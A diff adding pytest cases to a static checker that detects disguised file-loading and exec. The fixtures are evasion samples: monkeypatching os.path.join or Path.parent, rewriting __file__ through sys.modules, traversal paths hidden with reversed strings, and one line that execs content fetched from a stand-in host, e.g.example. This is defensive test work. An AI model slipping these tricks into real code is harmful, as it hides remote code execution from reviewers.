@@ -700,3 +700,117 @@ def test_standalone_check_clean_fixture_passes():
     f = check_artifact_read_unproven(ctx)
     assert f.status == PASS
     assert f.id == "B394"
+
+
+# ---------------------------------------------------------------------------------
+# B-850 round 3 (C-135 rejection of 2b4d6dc2): the fail-closed guard used to match by
+# NAME SPELLING (any Store/Del of an attribute spelled join/open/path/..., a fixed
+# handful of bare-Name spellings) regardless of the base object -- both a false-FAIL
+# blocker (self.path = p, setattr(self, k, v), self.__dict__.update(kw), ... is
+# ordinary code, no module in sight) and a bypass surface (any spelling the guard
+# didn't happen to enumerate). It is now RESOLUTION-based: only fires when the target
+# actually resolves to a sensitive namespace (os/os.path/sys/builtins/pathlib, a class
+# pulled from one of them, or a module reached dynamically via sys.modules/importlib/
+# __import__ under any alias).
+# ---------------------------------------------------------------------------------
+_R3_FALSE_POSITIVE_CASES = [
+    # FP1 is the highest-priority fix in this round: the self.path-style shape is
+    # extremely common, ordinary Python and was the primary real-fleet risk.
+    ("FP1-self-path-assignment", "pkg/mod.py",
+     _rd("os.path.join(here, 'v.py')", H)
+     + "class Store:\n    def __init__(self, p):\n        self.path = p\n"),
+    ("FP2-setattr-on-self", "pkg/mod.py",
+     _rd("os.path.join(here, 'v.py')", H)
+     + "class Cfg:\n    def __init__(self, **kw):\n        for k, v in kw.items():\n"
+     "            setattr(self, k, v)\n"),
+    ("FP3-self-dict-update", "pkg/mod.py",
+     _rd("os.path.join(here, 'v.py')", H)
+     + "class Cfg:\n    def __init__(self, **kw):\n        self.__dict__.update(kw)\n"),
+    ("FP4-self-open-attribute", "pkg/mod.py",
+     _rd("os.path.join(here, 'v.py')", H)
+     + "class Door:\n    def __init__(self):\n        self.open = False\n"),
+    ("FP5-vars-read-only", "pkg/mod.py",
+     _rd("os.path.join(here, 'v.py')", H)
+     + "def f(args):\n    return dict(vars(args))\n"),
+]
+
+
+@pytest.mark.parametrize("case_id,relpath,src", _R3_FALSE_POSITIVE_CASES)
+def test_ordinary_attribute_mutation_on_a_non_sensitive_base_stays_clean(case_id, relpath, src):
+    assert _verdict(src, relpath) == "clean", case_id
+
+
+_R3_GUARD_RESOLUTION_CASES = [
+    # A representative spread across the four bypass shapes the resolution-based
+    # redesign closes without a per-spelling special case (the full G1-G19 battery
+    # lives in the reviewer's own corpus, not reproduced here).
+    ("R3G1-builtins-setattr-indirection", "pkg/mod.py",
+     _rd("os.path.join(os.path.dirname(__file__), 'x.py')",
+         "import builtins\nbuiltins.setattr(os.path, 'join', lambda *a: '/tmp/x.py')\n")),
+    ("R3G6-sysmodules-under-an-alias", "pkg/mod.py",
+     "import sys as s\n"
+     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')",
+           "s.modules[__name__].__file__ = '/tmp/e/y.py'\n")),
+    ("R3G13-exec-of-compiled-literal", "pkg/mod.py",
+     _rd("os.path.join(os.path.dirname(__file__), 'x.py')",
+         "exec(compile(\"__file__ = '/tmp/e/y.py'\", 'c', 'exec'))\n")),
+    ("R3G17-pathlib-class-attribute-patched", "pkg/mod.py",
+     _rd("Path(__file__).parent / 'x.py'",
+         "Path.parent = property(lambda s: Path('/tmp'))\n")),
+]
+
+
+@pytest.mark.parametrize("case_id,relpath,src", _R3_GUARD_RESOLUTION_CASES)
+def test_resolution_based_guard_convicts(case_id, relpath, src):
+    assert _verdict(src, relpath) == "convict", case_id
+
+
+def test_lambda_in_comprehension_captures_the_comprehension_shadow():
+    # B-850 round 3 (L1): `_containment_comp_iters` used to stop at a `Lambda` --
+    # `[(lambda: open(...))() for open in [...]]` shadows the builtin `open` inside the
+    # lambda's body, a FREE name captured from the comprehension, not one of the
+    # lambda's own (zero) parameters.
+    src = (
+        HDR + "import urllib.request\n"
+        "[(lambda: exec(open(os.path.join(os.path.dirname(__file__), 'x.py'), 'rb')"
+        ".read().decode()))() for open in "
+        "[lambda *a, **k: urllib.request.urlopen('http://e.example/p')]]\n"
+    )
+    assert _verdict(src, "pkg/mod.py") == "convict"
+
+
+def test_walrus_read_before_it_in_argument_order_still_convicts():
+    # B-850 round 3 (W1): this round's OWN regression. `_bind` used to REPLACE the
+    # prior definition with the walrus's, so a read evaluated BEFORE the walrus in
+    # real left-to-right argument order (the first `exec()` argument reads `here`;
+    # only the SECOND rebinds it) wrongly saw only the walrus's post-value. Reads now
+    # see the MERGE of both -- worst-verdict-wins keeps this convicted regardless of
+    # which one the read "really" sees.
+    src = (
+        HDR + "here = '/tmp'\n"
+        "exec(open(os.path.join(here, 'x.py'), 'rb').read().decode(), "
+        "{} if (here := os.path.dirname(__file__)) else {})\n"
+    )
+    assert _verdict(src, "pkg/mod.py") == "convict"
+
+
+def test_walrus_in_a_statically_dead_boolop_branch_does_not_taint_later_reads():
+    # B-850 round 3 (W2): a walrus inside `False and (...)` never executes -- it must
+    # not overwrite (or even merge into) the real prior binding of `here`, which stays
+    # '/tmp' (NOT_ANCHORED) here. Inherited from round 1, not newly introduced this
+    # round.
+    src = (
+        HDR + "here = '/tmp'\n_ = False and (here := os.path.dirname(__file__))\n"
+        + _rd("os.path.join(here, 'x.py')")
+    )
+    assert _verdict(src, "pkg/mod.py") == "convict"
+
+
+def test_str_join_reversed_hidden_escape_convicts():
+    # B-850 round 3 (D1, staticness rework): a deterministic transform of purely
+    # literal arguments (`''.join(reversed('lit'))`) is just as foldable-in-principle
+    # as a PURE_FUNCS decoder like base64 -- round 2's blanket "any non-pure resolvable
+    # call -> runtime" rule wrongly downgraded this whole family to a bare
+    # runtime/UNPROVEN WARN instead of the correct static/ESCAPES conviction.
+    src = _rd("os.path.join(here, ''.join(reversed('yp.x/pmt/../../..')))", H)
+    assert _verdict(src, "pkg/mod.py") == "convict"
